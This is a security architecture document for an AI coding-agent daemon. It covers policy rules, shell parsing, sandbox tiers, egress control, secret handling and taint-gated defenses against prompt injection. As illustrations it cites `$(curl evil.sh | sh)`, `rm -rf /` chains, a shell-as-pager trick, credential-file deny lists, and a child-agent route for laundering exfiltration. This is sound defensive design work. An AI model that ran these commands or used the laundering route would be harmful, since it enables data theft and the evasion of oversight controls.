# Roundhouse Architecture — Security, Permissions, Isolation

> The policy engine, shell command handling, approvals, isolation tiers, network
> policy, secrets, trust boundaries and prompt-injection defenses, defaults, audit, and
> what is deliberately not being built. See
> `docs/superpowers/plans/2026-08-27-phase2-robustness.md` for the implementation plan
> (this subsystem is almost entirely Phase 2's scope).

## 6. Security, permissions, isolation

### 6.1 Three claims that drive everything

1. **The policy engine is a UX and intent layer, not a security boundary.** An argv
   allowlist cannot be made sound — `npm test` runs arbitrary JS, `git config
   core.pager='sh -c …'` is a shell, `make` is an interpreter. We say this in the docs
   rather than implying `allow git` is containment.
2. **There are exactly two real boundaries:** the OS isolation layer (what the process
   can touch) and the egress proxy (what data can leave). Everything else is depth.
3. **Fail-open is the actual bug.** Every mechanism here fails open by default; the
   daemon's job is to turn every silent degradation into a loud, recorded,
   session-blocking event.
4. **The spawn-boundary rule — one shape, applied everywhere a child crosses into or
   out of a parent's context.** *Capabilities* (things that let an agent spend, mutate,
   or escalate — credentials, approval grants, write access) never flow automatically;
   a child gets only what it is explicitly handed, and never more than its parent holds.
   *Restrictions* (things that exist to prevent harm — taint, denial rules) flow
   automatically and only ever tighten, never loosen, across the boundary in either
   direction. This single rule is what resolves team-memory access (§15.2), taint
   propagation (§6.8), sub-agent credential scoping (§9.9), and approval-grant scope
   across sub-agents (§6.4) — four questions that looked independent but were the same
   question asked four times.

### 6.2 Policy engine

Every task passes `Policy::decide` before execution — **including tasks originating from
an external ACP agent we are driving**. Decisions are `Allow | Ask | Deny`, and match on
**typed, parsed** parameters, never raw strings:

```rust
pub enum TaskParams {
    Shell(ParsedCommand),
    Fs   { op: FsOp, path: PathBuf, canonical: Result<PathBuf, PathErr> },
    Http { method: Method, url: Url, body_len: usize },
    Mcp  { server: ServerId, tool: String, args: serde_json::Value },
    Git  { subcommand: String, argv: Vec<String>, remote: Option<Url> },
    Agent{ provider: ProviderId, model: String, tier_request: Tier },
    /* … */
}
```

Path rules match the **canonicalised** path. A path that fails to canonicalise (dangling
symlink, TOCTOU race) is `Deny`, never `Ask` — a human cannot evaluate it.

**Precedence.** Scopes rank `Builtin(0) < UserGlobal(1) < Project(2) < Workspace(3) <
Grant(4)`. **Deny wins unconditionally at any scope** — no allow overrides a deny; to
override you edit the deny. Among non-deny matches: higher scope, then specificity
(`(exact_argv, literal_prefix_len, bound_predicate_count)`), then file order.

**What distinguishes `Project` from `Workspace` (both are per-repo, but differ in who
can write them and where the files live):**
- **`Project`** is the repo-committed config: `.roundhouse/policy.toml` and
  `.roundhouse/config.toml` inside the repo itself, checked in, visible to every clone —
  and, critically, **a file the agent working in that repo could itself have written**.
  That is exactly the surface the precedence rule below narrows.
- **`Workspace`** is a local, per-machine override for *this one checkout*, stored
  outside the repo entirely (under the state dir, keyed by
  `blake3(repo_root)` — e.g. `~/.local/state/roundhouse/workspaces/<hash>/config.toml`),
  never committed and never visible to the agent as a file it could edit through normal
  tool calls. It exists for personal, host-specific tweaks ("always auto-approve
  `cargo fmt` on my laptop") that shouldn't be pushed to teammates via the shared repo
  config. Because it is human-authored and outside the agent's write surface, it is
  trusted more than `Project` — which is why it outranks it.
>
> **The single most important precedence rule:** `.roundhouse/policy.toml` (`Project`
> scope) lives in a repo the agent may itself have written. **Project scope may narrow,
> never widen**, unless the user has recorded a trust decision keyed on
> `(repo_root, blake3(policy_file))`. `Workspace` scope carries no such restriction — it
> is never agent-writable in the first place.

(Naming note: `Workspace` the config-precedence scope above is a narrower, specific
thing than `Workspace` the product noun in §3.1, "a project root and the config/policy/
memory scoped to it" — the product noun covers everything scoped to a repo, including
both the `Project` and `Workspace` config scopes defined here plus memory and policy as a
whole. Same word, two levels of the same hierarchy; context disambiguates.)

**Sealed deny floor** (compiled in, matched first, not editable from config): writes to
`~/.ssh`, `~/.gnupg`, `~/.aws`, `~/.config/roundhouse`, the state dir, the daemon binary;
programs `sudo`/`doas`/`pkexec`/`nsenter`/`unshare`/`chroot`/`systemd-run`; MCP tools on
unresolved servers; any task where `attested_tier < requested_tier`. One escape,
`round daemon --unsealed`, recorded on every task in the session.

**Modes are rule bundles, not special cases** — a named `Vec<Rule>` injected at
`Builtin+1` plus a `default_for(kind)` table, so there is no mode branching in the
engine. `plan` (deny-by-default, read/find/chat allowed) · `ask` (default) ·
`accept-edits` · `auto`. `auto` carries a `Tier{at_least: Sandbox}` predicate on its own
rules, which is why YOLO is not a special case: **if the sandbox degraded, the mode's
rules stop matching and the session silently falls back to `Ask`.**

### 6.3 Shell — the hard case

**We do not exec through a shell.** Default path is `execve(program, argv)` with no
interpreter. Model-emitted command *strings* are parsed with a real shell grammar,
**starting with `brush-parser`** (pure Rust, full AST) rather than `yash-syntax`: the
commands hitting this parser are LLM-generated and overwhelmingly *bash*, not strict
POSIX `sh` — array syntax, `[[ ]]`, process substitution, `local`, here-strings —
and `yash-syntax`'s POSIX completeness is the wrong axis of correctness for classifying
them. `brush-parser`'s false-Opaque rate against a real corpus is the go/no-go gate
(§6.12) for keeping it. **Do not use `shell-words`**: it only splits, and will hand you
`rm` from `git status; rm -rf /` as an innocent word list.

Algorithm:
1. Parse. Unparseable → `Opaque`.
2. **`VariableExpansion` is resolved, not treated as opaque.** The daemon fully controls
   and knows every session's environment, so plain `$VAR`/`${VAR}` references (with no
   command substitution inside them) are expanded to their literal values *before*
   classification, and the expanded argv is what gets matched against rules in step 6.
   There is nothing to hide here — we set every variable ourselves — so this was never
   truly opaque, only unresolved by a static parser. This also directly reduces the
   false-Opaque rate the parser bake-off (§6.12) is gated on.
3. Any of `CommandSubstitution`, `ProcessSubstitution`, `Eval`, `Source`, `HereDoc`,
   `Backgrounding` → **`Opaque`**, and Opaque is **hard-`Deny` in every shipped profile —
   no `Ask` escape route for agent-initiated commands.** Resolving what
   `$(curl evil.sh | sh)` does would require running untrusted code just to render an
   approval prompt, which defeats the point; no rendering makes that review task
   reviewable. The denial is a structured tool error (`{error, rule, hint}`, same shape
   as §8.5's unattended-permission pattern) instructing the model to restructure: run the
   inner command as its own `shell` task, capture the result, then reference the literal
   captured value in a follow-up command. One unreviewable blob becomes two ordinary,
   reviewable tool calls. `shell.raw` still exists as a capability, but is reserved for a
   **human typing directly into their own composer** — a different trust situation
   entirely, since the human is authoring it live rather than reviewing a black box after
   the fact — and is never reachable via an agent's `Ask` path.
4. Pipelines and `;`/`&&`/`||` are not automatically opaque, but the command runs **only
   if every node independently matches an Allow rule** and no node is an interpreter.
   Being a conjunction, `git status && rm -rf /` fails on the second node.
5. Redirections are evaluated as synthetic `write` tasks against the path rules.
6. `InterpreterProgram` nodes (`sh`, `bash`, `python`, `perl`, `awk`, `xargs`, `env`,
   `node`, `make`, `ssh`) are `Ask` regardless of any allowlist match, unless a rule
   names them with `allow_interpreter = true`. We do not analyse the payload.
7. Node matching is on `(resolved_program, argv[..])` with exact / argv-prefix / per-slot
   glob matchers — **never substring or prefix match on the raw string**, which is how
   every published bypass works.
8. We `execve` each node and wire pipes ourselves. Aliases don't exist because we never
   start a shell. Globs, if permitted, are expanded by us, bounded, rooted at the
   workspace.

**Residual risk, plainly.** Allowing `cargo test` allows arbitrary `build.rs`. Allowing
`git` allows `git config` to install a shell as pager. Allowing `make`/`npm`/`docker` is
allowing everything. The parser closes the *syntactic* bypasses; it cannot close the
*semantic* ones. Argv allowlists reduce prompt fatigue for already-trusted commands —
they are not the containment story. Containment is §6.5 and §6.6.

### 6.4 Approvals

An `Ask` moves the task to `Suspended{AwaitingApproval}` and **persists it** — pending
approvals surviving daemon restart is exactly the competitor bug class in §1.1 #2.
Grant scopes: `Once | Session | ExactArgv{hash} | Directory{path} | Always`.
A grant synthesises a rule **generalised downward only** — never broader than the task
that produced it — written with provenance (session, task, timestamp) as a comment.

**Grant direction across the spawn tree follows §6.1's rule: a `Session`-scoped grant
flows down to children spawned afterward, never up to the parent or sideways to
siblings.** A grant made while approving a task *inside a sub-agent's session* is
recorded at that sub-agent's own scope — its own future children see it (same downward
flow as any parent), but the session that spawned it does not retroactively gain it, and
neither does a sibling sub-agent. This is not a new mechanism: `GrantScope::Always`
already exists precisely for the case where a human wants a decision to apply beyond one
session, and it writes to `Workspace`/`UserGlobal` scope explicitly (§6.2's precedence
table) — so "broader than this session" is always an intentional, visible choice at
approval time, never an accidental side effect of where in the tree the approval prompt
happened to fire.

Approvals broadcast to every attached client; first responder wins. The Unix socket uses
peer-credential checks (`SO_PEERCRED`); the HTTP surface binds loopback only with a token
from the state dir.

**Unattended runs** get `ApprovalPolicy::{Interactive | DenyAll | Preapproved{bundle} |
Notify{sink,timeout,on_timeout}}`. Scheduled sessions default to `DenyAll` — but the task
**blocks rather than failing**, so a human can attach later and unblock it. There is no
"unattended = auto-approve"; you write a `Preapproved` bundle and it is a reviewable
artifact.

**ACP mapping.** As ACP *server*, `Ask` → `session/request_permission`; our richer grant
scopes collapse to `allow_always` on the wire and are recorded at full fidelity locally.
As ACP *client*, an external agent's permission request is normalised into `TaskParams`
and fed to **our** engine first. Critical: such tasks record
`enforced_by = RemoteAgentClaim` — the external agent's declared tool call is unverified
metadata, so **an ACP-client session must additionally run at tier ≥ Sandbox**.

### 6.5 Isolation tiers

```rust
#[derive(PartialOrd, Ord)]
pub enum Tier { None, Worktree, Sandbox, Container, Remote }

pub trait Isolate: Send + Sync {
    fn declared(&self) -> Tier;
    async fn probe(&self) -> ProbeResult;                    // real syscalls, at startup
    async fn prepare(&self, spec: &SessionSpec) -> Result<Handle, IsolationError>;
    async fn spawn(&self, h: &Handle, cmd: CommandSpec) -> Result<Child, IsolationError>;
    fn attest(&self, h: &Handle) -> Attestation;
    async fn teardown(&self, h: Handle) -> Result<(), IsolationError>;
}
```

Tiers **compose**: an `IsolationStack` pairs a `WorkspaceLayer` (Shared / GitWorktree /
ContainerVolume / RemoteFs) with a `Vec<Box<dyn Enforcer>>` (Landlock, Seccomp,
Bubblewrap, Seatbelt, Netns). Worktree is a *workspace* concern, sandbox an *enforcement*
concern; `Worktree + Sandbox` is the intended common case — bwrap binds the worktree rw,
`.git` ro-except-`worktrees/<id>`, everything else invisible.

**`Tier::Remote` never makes a remote host a co-writer to the store.** A remote worker's
`spawn()` sends the `CommandSpec` over the network and streams results back to *this*
daemon, which appends the resulting events through its own single writer exactly as it
would for local execution — the network hop lives entirely in the execution path, never
the storage path. This is the same principle §7.8's `RemoteBus` already states for
messaging ("workers never resolve" — the daemon stays sole authority), and it's why the
single-SQLite-writer model needs no change at any remote-worker scale. A genuinely
different scenario — multiple daemon instances on different machines sharing one
logical store — is a separate, harder distributed-systems problem that was never
proposed and is already out of scope (§12.6: "the session and its log stay on the
daemon's host").

**Fail-open is made structurally impossible by four rules:**

1. `probe()` at startup **actually exercises** each mechanism (enforce a throwaway
   Landlock ruleset; `bwrap --ro-bind / / -- /bin/true`; `sandbox-exec -p '(version
   1)(deny default)'`; install a seccomp filter in a forked child), cached on
   `(kernel_release, binary_hashes, apparmor_sysctl)`.
2. `prepare()` **errors** if `achieved < requested`. It does not warn. The session does
   not start; the client shows the specific degradation and offers an explicit downgrade.
3. Downgrade requires `SessionSpec.on_degrade: Refuse` (default) or `AllowDownTo(Tier)`,
   set by the human at creation and recorded.
4. `attest().digest` is written on **every task row**, not once per session — tiers can
   change mid-session, and the audit question is always "what contained *this* action."

**macOS post-Seatbelt.** `sandbox-exec` is documented deprecated with no announced
replacement; when it eventually disappears, **macOS's `Sandbox` tier has no direct
equivalent — it collapses to `Container`, not to a hand-built App Sandbox entitlement
path.** App Sandbox is the wrong tool: it's designed for an app to sandbox *itself*, with
entitlements declared at build/signing time for a fixed bundle, whereas this needs to
confine an arbitrary subprocess spawned at runtime under a policy decided dynamically per
session. A VM-backed Container tier (e.g. `libkrun`/Virtualization.framework, per §5.3)
already has to exist for the product's container/remote-worker isolation option, so this
isn't new engineering — it's the same fail-open rules above applying identically: `probe()`
reports Seatbelt unavailable, session creation for `Sandbox` tier errors rather than
silently degrading, and the human explicitly chooses `Container` or an accepted downgrade
to `Worktree`. No change to near-term priority — Seatbelt is functional today and stays
the lower-friction default for local macOS use.

Landlock `BestEffort` is where fail-open hides: we compute the delta between requested and
supported access rights, and a non-empty delta is a recorded `Degradation`, not a shrug.
On Ubuntu 23.10+ we ship `/etc/apparmor.d/roundhouse` permitting `userns create`; on an
AppArmor-signature bwrap failure the error names the profile and the install command —
**we never suggest flipping `kernel.apparmor_restrict_unprivileged_userns`.**

**We vendor bubblewrap's binary, not its namespace-creation logic.** AppArmor profiles
attach per-executable-path at exec time — if the daemon execs the *system's* `bwrap`, our
profile doesn't cleanly cover that child without reasoning carefully about exec
transitions, and some distros ship their own conflicting profile for a system-wide
`bwrap`. Reimplementing namespace/mount setup ourselves via raw
`clone(CLONE_NEWUSER|CLONE_NEWNS)` would dodge that ambiguity but takes on real
container-escape risk reinventing a hardened primitive — the same instinct behind
never building a "safe shell" (§6.11) applies here. Instead: bundle a **static bwrap
binary at a path we control** (e.g. `/usr/libexec/roundhouse/bwrap`); this removes the
dependency on bwrap being pre-installed *and* gives the AppArmor profile an unambiguous,
conflict-free target — while the actual namespace/mount work still runs through bwrap's
own battle-tested internals, not ours.

### 6.6 Network policy — the exfiltration boundary

**Two physically separated lanes.** The **control lane** (provider APIs, `web` search
backends, ACP transports, telemetry) is the daemon's own; credentials live only here and
the sandbox has no route to it. The **agent lane** (everything an agent initiates) exits
solely through a per-session loopback proxy with a bearer token.

Enforcement by tier — stated honestly:

| Tier | Mechanism | Real? |
|---|---|---|
| Container / Remote | netns, no default route, only proxy reachable | ✅ enforced |
| Bubblewrap | `--unshare-net` + slirp/pasta or bound proxy socket | ✅ enforced |
| Landlock only | TCP connect restricted **by port**; deny 53 to force DNS through proxy | ⚠️ agent can still reach *any host* on the proxy's port. `net_enforced = false`; `auto` mode refuses to run here |
| None / Worktree | proxy env vars only — a convention a determined process ignores | ❌ `net_enforced = false` |

**TLS: CONNECT/SNI filtering by default, no interception.** We match the CONNECT target
or ClientHello SNI against the allowlist and never terminate TLS — keeping cargo/npm/pip/
git working and avoiding owning a CA. Optional `mode = "intercept"` installs a per-install
CA **into the sandbox's trust store only, never the host's**, enabling path-level rules
and outbound secret scanning. Honest gap: SNI can be omitted or lied about, and ECH will
eventually break SNI filtering entirely — which is why the container tier additionally
pins egress to the proxy socket, making SNI a policy *label* rather than the reachability
control.

`http` tasks execute **through the same proxy and policy**, so they get URL-level rules
for free and share one audit stream with shell-initiated traffic. A blocked request
produces a real `Deny` task record with the URL, not a network error the model must guess
at. `web` tasks run on the control lane (the search key never reaches the agent) and
their snippets are `Trust::Untrusted`; fetching a result page is a separate `http` task.
`169.254.169.254` is denied always.

### 6.7 Secrets

OS keyring first; `~/.config/roundhouse/secrets.toml` mode 0600 as fallback — and **the
fallback is recorded as a startup `Degradation` visible in the UI**, not a log line.
Config holds `SecretRef`, never material. `Secret(secrecy::SecretString)` has no `Debug`/
`Display`/`Serialize`, and `expose_for_request` requires a `ControlLaneToken` that is
unconstructable outside the daemon's provider/MCP modules — a type-level guarantee that
secrets cannot reach the executor.

Provider calls never leave the daemon, so no key enters a child environment. MCP stdio
servers are spawned **by the daemon, outside the session's namespace**; the agent talks to
them over a pipe the daemon proxies, so it cannot `cat /proc/<mcp>/environ`.

**We enforce a read *denylist*, not a read allowlist.** The industry consensus that "read
confinement breaks toolchains" is about *allowlisting the workspace*. Denying reads of
`~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.config/roundhouse`, `~/.docker/config.json`, `~/.netrc`,
`~/.kube` breaks essentially nothing and is cheap in Landlock, bwrap and Seatbelt alike.
On by default at tier ≥ Sandbox; advisory-only below (say so).

**Redaction runs at the persistence boundary, before the SQLite write** — an Aho–Corasick
automaton over live secret values plus high-confidence patterns. Because it is pre-write,
a leaked value never lands in the log and a compromised web UI cannot un-redact. The same
redactor runs on **outbound** provider payloads; a detected secret in a prompt is a
`SecretLeak` event (`Ask` by default, `Deny` hardened). Lossy against transformed secrets
(base64, chunk-split) — documented gap. `redactions: u32` on every task makes redaction
*failure* visible as a zero.

### 6.8 Trust boundaries and prompt injection

Untrusted: model output, MCP results **and tool descriptions**, fetched web/http content,
peer-agent messages, ACP external agent claims, and project config until trusted. Every
content block carries `Provenance { origin, trust, task }` with exactly two trust levels —
no "semi-trusted."

**The non-obvious mitigation: taint-gated autonomy.** `PolicyInput.taint` is the union of
`Trust` over everything that entered context since the session's last human turn. All
`Always`/`Session` allow-grants for irreversible or exfiltrating kinds (`http` non-GET,
`git push`, writes outside the workspace, `agent` spawn, `message`) implicitly carry
`MaxTaint(Trusted)`. **Concretely: the moment an agent reads a web page or an MCP result,
its standing permission to push or POST downgrades to `Ask` until the human speaks
again.** Cheap, deterministic, no classifier, and it targets the fetch-then-exfiltrate
chain directly.

Second: **irreversibility requires a fresh human turn** — `git push --force`, `rm -rf`
outside the workspace, non-allowlisted POST, and secret-leak events are `Ask` in *every*
mode including `auto`.

**Taint crosses the spawn boundary monotonically, in both directions, regardless of
provider** — the "restrictions never loosen" half of §6.1's spawn-boundary rule. A child
session's `taint` is seeded from its parent's current `TaintSet` at spawn time (a clean
parent cannot be laundered clean-again by delegating to a child; a tainted parent cannot
produce an untainted child just by handing off work). On return, the parent's `TaintSet`
becomes the union of its own and the child's: `parent.taint = parent.taint ∪
child.taint`. Without the return-side merge, an agent could launder untrusted-content
exposure by spawning a child to read the poisoned page, discard the child, and receive
the "clean" extracted answer — exactly the fetch-then-exfiltrate chain this mechanism
exists to close. This holds identically whether the child runs on the same provider or a
different one; taint is a property of what entered *context*, not of which model saw it.

**Where we stop, documented not assumed away:** we do not defend against a model
persuaded to act entirely within its granted permissions; we do not run LLM-based
injection classifiers (unreliable, adds a provider to the security path, breeds false
confidence); we do not sanitise untrusted content into "safe" prompts. `round doctor`
prints these gaps.

### 6.9 Defaults

**Out of box:** `Worktree + Sandbox`, mode `ask`, `connect_sni` with a registry/git
allowlist, `on_degrade = Refuse`, keyring secrets, taint gating on, project policy
untrusted. If no sandbox probes clean, first session creation *blocks* on a choice:
install the AppArmor profile, use the container tier, or explicitly accept `Worktree`
only — recorded on every task.

**`--profile hardened`:** container tier with netns; proxy `intercept` with outbound
secret scanning set to `Deny`; empty allowlist by default; `GrantScope::Always` disabled
(`max_grant = "session"`); `auto` forbidden; `shell.raw` denied outright; read-denylist
extended to all of `$HOME` except the workspace; MCP servers pinned by binary hash; no
approval timeout; **container image pinned by content digest — an unpinned or tag-based
image (`:latest`) refuses to start.** Same "strip implicit conveniences, force explicit
choices" pattern as every other item on this list.

**Container image supply chain: no official Roundhouse-published or -signed image.**
Hosting and patching a golden image is exactly the kind of centralized-infrastructure
commitment this local-first design already declines elsewhere (§6.11 — no cloud policy
service, no automatic secret rotation) — it would make users trust our registry and our
patch cadence for a security-critical path. Instead: a documented interface an image
must satisfy (exec commands, mount the workspace, honor the network proxy) plus a
reference `Containerfile` checked into the repo as a starting example, reviewed through
the normal git/PR process rather than a separately-signed artifact. Docs may point at
independently-trusted minimal bases (Debian slim, distroless) as a starting point — pure
documentation, zero hosting obligation.

### 6.10 Audit

`TaskSecurity` carries decision, matched rule (with literal text denormalised),
`policy_digest` (hash of the full resolved ruleset at decision time), mode, actor,
approval record (who, which client, peer uid/pid, scope, latency), requested and
**attested** tier, `net_enforced`, workspace root, cwd, the parsed command AST alongside
the raw string, canonical paths, egress records, `taint_in`/`taint_out`, provenance,
redaction count, exit status and duration.

Written in the **same SQLite transaction** as the task, so a task without its security
record is impossible by construction. `round audit verify` recomputes a rolling hash chain
over `(task_id, security_digest)`. Not tamper-*proof* — a local root can rewrite the
chain. Stated, not overclaimed.

### 6.11 Deliberately not building

A "safe shell" (every one ever written has been escaped — we remove the shell instead) ·
LLM-based injection classifiers or output scanners · semantic analysis of interpreted
payloads · syscall-level read *allowlisting* of the workspace · cloud policy service or
SSO-gated approvals · tamper-proof audit sinks (we ship a hash chain and say local root
wins) · automatic secret rotation · defending the daemon against a local attacker already
running as the user.

### 6.12 Open questions

~~Shell parser bake-off.~~ **Decided (§6.3): start with `brush-parser`**, not
`yash-syntax` — bash-isms matter more than POSIX completeness for LLM-emitted commands.
**Not yet empirically verified**: run the Phase 2 bake-off against a real corpus
(Claude Code's own transcript history is a ready-made source per §1.1 — 5,428 recorded
assistant tool calls). **Decision rule, locked in now so the unknown doesn't block
anything:** if `brush-parser`'s false-Opaque rate exceeds 15%, fall back to
`yash-syntax` and accept its bash-extension gaps as `Opaque` by design rather than
patching a POSIX parser to understand bash.

~~Approval UX for `Opaque`.~~ **Decided (§6.3):** no rendering can make "review a
`$(...)` string" a safe human task, so we don't try. `VariableExpansion` is resolved and
reclassified before it ever reaches Opaque (nothing to review — we control the
environment); the remaining irreducible hazards are hard-`Deny` in every shipped
profile with a structured restructure-hint back to the model, never an `Ask`.
`shell.raw` survives only as a human-typed-directly capability, never agent-reachable.

~~macOS post-Seatbelt.~~ **Decided (§6.5):** collapses to `Container`, not a bespoke App
Sandbox entitlement path — App Sandbox is built for self-sandboxing an app, not confining
an arbitrary runtime-spawned subprocess under a dynamic policy. No new engineering; the
existing fail-open rules and Container tier already cover it.

~~Vendor a Linux sandbox helper?~~ **Decided (§6.5): vendor bwrap's binary, not its
namespace logic** — a static bwrap at a path we control, giving the AppArmor profile an
unambiguous target without reimplementing a hardened container primitive ourselves.

~~Container image supply chain.~~ **Decided (§6.9): no official image — bring-your-own,
pinned by digest, required (not optional) under `--profile hardened`.**

*(All of §6's open questions are now resolved.)*

~~Sub-agent grant algebra / cross-provider taint on return.~~ **Resolved (§6.1, §6.8):**
taint flows down at spawn and merges back up on return, unconditionally and regardless
of provider — restrictions only ever tighten across the boundary, never loosen.

